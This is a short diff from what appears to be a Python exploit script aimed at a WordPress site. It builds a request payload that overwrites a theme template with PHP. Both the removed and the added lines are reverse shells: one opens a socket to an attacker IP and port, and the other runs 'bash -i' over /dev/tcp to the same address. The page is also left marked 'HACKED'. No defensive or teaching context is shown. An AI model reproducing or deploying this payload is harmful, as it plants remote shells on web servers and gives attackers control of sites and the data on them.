@@ -10,7 +10,7 @@ payload = lambda ip, port, nonce: {"nonce": nonce,
 "newcontent":
 f"""
 <?php get_header(); ?>
-<?php $s=fsockopen("{MYIP}",{MYPORT});exec("sh<&3>&3 2>&3");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{MYIP}/{MYPORT} 0>&1'");?>
 HACKED
 <?php
 get_footer();""",
